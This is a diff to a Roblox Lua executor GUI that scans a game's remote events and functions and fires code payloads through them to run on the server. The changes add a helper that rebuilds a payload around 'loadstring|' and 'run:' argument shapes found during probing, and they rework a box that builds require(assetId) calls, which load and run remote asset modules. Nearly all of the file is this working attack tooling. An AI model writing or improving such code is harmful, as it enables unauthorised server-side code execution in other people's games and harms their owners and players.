@@ -11,7 +11,7 @@ local VERSION = "5.0"
 local BOOT_STAMP = os.date("%H:%M:%S")
 
 local ROOT_W = 470
-local ROOT_H = 370
+local ROOT_H = 350
 
 local THEMES_LIST = {
 	{ name = "CYAN", c = Color3.fromRGB(0, 240, 220) },
@@ -401,6 +401,7 @@ local function toast(title, body, color)
 			Parent = list,
 		})
 	end
+	card.Parent = list
 	card.LayoutOrder = -math.floor(os.clock() * 1000)
 	card.Position = UDim2.new(0, 0, 0, -80)
 	TweenService:Create(card, TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
@@ -607,7 +608,7 @@ create("UIListLayout", {
 
 local Content = create("Frame", {
 	Name = "Content",
-	Size = UDim2.new(1, -20, 0, 272),
+	Size = UDim2.new(1, -20, 0, 250),
 	Position = UDim2.new(0, 10, 0, 69),
 	BackgroundTransparency = 1,
 	ClipsDescendants = true,
@@ -804,6 +805,28 @@ local function sendPayload(remote, payload)
 		return pcall(remote.FireServer, remote, payload)
 	end
 	return pcall(remote.InvokeServer, remote, payload)
+end
+
+-- rebuild a shape remembered from scanning around new code: tables get the
+-- string slot replaced, prefixed strings get re-prefixed
+local function applyWorkingShape(shape, code)
+	if type(shape) == "table" then
+		local clone = {}
+		for k, v in pairs(shape) do
+			clone[k] = (type(v) == "string") and code or v
+		end
+		return clone
+	end
+	if type(shape) == "string" then
+		if shape:sub(1, 11) == "loadstring|" then
+			return "loadstring|" .. code
+		end
+		if shape:sub(1, 4) == "run:" then
+			return "run:" .. code
+		end
+		return code
+	end
+	return code
 end
 
 -- score structural signals beyond the name: parent location, sibling names, argument hints
@@ -1303,7 +1326,7 @@ local function renderRequires()
 		hoverify(remB, THEME.accent, Color3.fromRGB(0, 190, 172))
 
 		bindClick(useB, function()
-			UI.RequireIdBox.Text = rq.id
+			UI.RequireBox.Text = "require(" .. rq.id .. ')("' .. PlayerName .. '")'
 			switchTab("exec")
 			outputLine("filled require(" .. rq.id .. ") — pick target and press EXECUTE")
 		end)
@@ -1554,7 +1577,7 @@ local ExecPage = pages.exec
 create("TextLabel", {
 	Size = UDim2.new(1, 0, 0, 12),
 	BackgroundTransparency = 1,
-	Text = "Pick a target (LOCAL = your own client), paste lua or a require-ID, then run.",
+	Text = 'Pick a target (LOCAL = your own client), paste lua or a full require(...) call, then run.',
 	TextColor3 = THEME.dim,
 	TextSize = 9,
 	Font = Enum.Font.Gotham,
@@ -1597,7 +1620,7 @@ create("TextLabel", {
 	Size = UDim2.new(1, -156, 0, 26),
 	Position = UDim2.new(0, 156, 0, 46),
 	BackgroundTransparency = 1,
-	Text = "LUA = raw lua code · REQUIRE = require(ID)(args)",
+	Text = 'LUA = raw lua code · REQUIRE = full call e.g. require(ID).load("NAME")',
 	TextColor3 = THEME.dim,
 	TextSize = 9,
 	Font = Enum.Font.Gotham,
@@ -1636,9 +1659,9 @@ UI.RequireGroup = create("Frame", {
 })
 
 create("TextLabel", {
-	Size = UDim2.new(0.5, -5, 0, 11),
+	Size = UDim2.new(1, 0, 0, 11),
 	BackgroundTransparency = 1,
-	Text = "ASSET ID:",
+	Text = "REQUIRE CALL (paste full call, or just an asset id):",
 	TextColor3 = THEME.dim,
 	TextSize = 9,
 	Font = Enum.Font.GothamBold,
@@ -1646,13 +1669,13 @@ create("TextLabel", {
 	Parent = UI.RequireGroup,
 })
 
-UI.RequireIdBox = create("TextBox", {
-	Size = UDim2.new(0.5, -5, 0, 26),
+UI.RequireBox = create("TextBox", {
+	Size = UDim2.new(1, 0, 0, 26),
 	Position = UDim2.new(0, 0, 0, 13),
 	BackgroundColor3 = Color3.fromRGB(8, 8, 12),
 	BackgroundTransparency = 0.1,
 	Text = "",
-	PlaceholderText = "6338277134",
+	PlaceholderText = 'require(73888902428931).load("' .. PlayerName .. '")',
 	PlaceholderColor3 = THEME.dim,
 	TextColor3 = THEME.text,
 	TextSize = 12,
@@ -1661,38 +1684,8 @@ UI.RequireIdBox = create("TextBox", {
 	BorderSizePixel = 0,
 	Parent = UI.RequireGroup,
 })
-corner(UI.RequireIdBox, 7)
-stroke(UI.RequireIdBox, THEME.stroke, 1, 0.4)
-
-create("TextLabel", {
-	Size = UDim2.new(0.5, 0, 0, 11),
-	Position = UDim2.new(0.5, 5, 0, 0),
-	BackgroundTransparency = 1,
-	Text = "ARGS (empty = your name):",
-	TextColor3 = THEME.dim,
-	TextSize = 9,
-	Font = Enum.Font.GothamBold,
-	TextXAlignment = Enum.TextXAlignment.Left,
-	Parent = UI.RequireGroup,
-})
-
-UI.RequireArgsBox = create("TextBox", {
-	Size = UDim2.new(0.5, -5, 0, 26),
-	Position = UDim2.new(0.5, 5, 0, 13),
-	BackgroundColor3 = Color3.fromRGB(8, 8, 12),
-	BackgroundTransparency = 0.1,
-	Text = "",
-	PlaceholderText = '"' .. PlayerName .. '"',
-	PlaceholderColor3 = THEME.dim,
-	TextColor3 = THEME.text,
-	TextSize = 12,
-	Font = Enum.Font.Code,
-	ClearTextOnFocus = false,
-	BorderSizePixel = 0,
-	Parent = UI.RequireGroup,
-})
-corner(UI.RequireArgsBox, 7)
-stroke(UI.RequireArgsBox, THEME.stroke, 1, 0.4)
+corner(UI.RequireBox, 7)
+stroke(UI.RequireBox, THEME.stroke, 1, 0.4)
 
 UI.RequirePreview = create("TextLabel", {
 	Size = UDim2.new(1, 0, 0, 40),
@@ -2236,52 +2229,32 @@ bindClick(UI.CopyAllBtn, function()
 end)
 
 local function buildRequireCall()
-	local idRaw = UI.RequireIdBox.Text
-	local args = UI.RequireArgsBox.Text
-	-- The user may have typed a full require expression (e.g. require(123).load("x"))
-	-- straight into the asset-id box. Send it as-is, never split it apart.
-	if idRaw:match("require%s*%(") then
-		if args ~= "" then
-			local c = args:match("^%s*(.)")
-			if c == "." or c == ":" or c == "(" or c == "[" then
-				return idRaw .. args
-			end
-			return idRaw .. "." .. args
-		end
-		return idRaw
-	end
-	-- whole expression in the args box
-	if args:match("require%s*%(") then
-		return args
-	end
-	local id = idRaw:match("%d+")
-	if not id then
+	local raw = UI.RequireBox.Text
+	raw = raw:gsub("^%s+", ""):gsub("%s+$", "")
+	if raw == "" then
 		return nil
 	end
-	if args == "" then
-		args = '"' .. PlayerName .. '"'
-		return "require(" .. id .. ")(" .. args .. ")"
+	-- full expression typed in (e.g. require(73888902428931).load("Name"))
+	-- is executed exactly as written, never split apart
+	if raw:match("require%s*%(") then
+		return raw
 	end
-	local c = args:match("^%s*(.)")
-	-- ".load(\"x\")", ":method(...)", "(...)", "[...]" -> chain after require(...)
-	if c == "." or c == ":" or c == "(" or c == "[" then
-		return "require(" .. id .. ")" .. args
+	-- bare asset id -> require(id)("PlayerName")
+	local id = raw:match("^%d+$")
+	if id then
+		return "require(" .. id .. ')("' .. PlayerName .. '")'
 	end
-	-- "load(\"x\")" (identifier followed by a call) -> require(id).load("x")
-	if args:match("^%s*%g+%s*%b()") then
-		return "require(" .. id .. ")." .. args
-	end
-	-- otherwise treat args as a plain argument list/value -> require(id)(ARGS)
-	return "require(" .. id .. ")(" .. args .. ")"
+	return nil
 end
 
 local function updateRequirePreview()
 	local built = buildRequireCall()
-	UI.RequirePreview.Text = "preview: " .. (built or "require(<id>)(...)— enter an asset id")
+	UI.RequirePreview.Text = "preview: "
+		.. (built or 'require(<id>)("NAME") — paste a full require(...) call or just an asset id')
 end
 
-UI.RequireIdBox:GetPropertyChangedSignal("Text"):Connect(updateRequirePreview)
-UI.RequireArgsBox:GetPropertyChangedSignal("Text"):Connect(updateRequirePreview)
+UI.RequireBox:GetPropertyChangedSignal("Text"):Connect(updateRequirePreview)
+updateRequirePreview()
 
 local ballDown = false
 local ballDragStart, ballStartPos, ballMoved
@@ -2436,16 +2409,12 @@ local function executeCurrent()
 		outputLine("[i] already executing...")
 		return
 	end
-	State.executing = true
-	task.delay(3, function()
-		State.executing = false
-	end)
 	local mode = State.modes[State.modeIndex]
 	local code
 	if mode == "REQUIRE" then
 		local built = buildRequireCall()
 		if not built then
-			outputLine("[x] invalid asset id")
+			outputLine('[x] invalid input — paste e.g. require(73888902428931).load("Name") or an asset id')
 			return
 		end
 		code = built
@@ -2454,11 +2423,15 @@ local function executeCurrent()
 		-- server-side through the remote. Identical semantics to executing
 		-- the script locally, only it executes on the server instead.
 		code = UI.CodeBox.Text
-		if code == "" then
+		if code:gsub("%s+", "") == "" then
 			outputLine("[x] empty code")
 			return
 		end
 	end
+	State.executing = true
+	task.delay(3, function()
+		State.executing = false
+	end)
 	local confirmGuid
 	local ref = State.targetRefs[State.targetIndex]
 	if ref ~= nil and State.settings.confirmExec then
@@ -2474,15 +2447,16 @@ local function executeCurrent()
 		end
 		task.spawn(function()
 			local isFunc = ref:IsA("RemoteFunction")
-			local shapes = { code }
-			-- reuse the argument shape that worked during scanning when known
+			local shapes
+			-- reuse the argument shape that worked during scanning when known,
+			-- rebuilt around the current code so the payload actually arrives
 			for _, m in ipairs(State.results) do
 				if m.remote == ref and m.workingShape ~= nil then
-					shapes = { m.workingShape }
+					shapes = { applyWorkingShape(m.workingShape, code) }
 					break
 				end
 			end
-			if shapes[1] == code and #shapes == 1 then
+			if not shapes then
 				shapes = probeVariants(code)
 			end
 			local sent = false
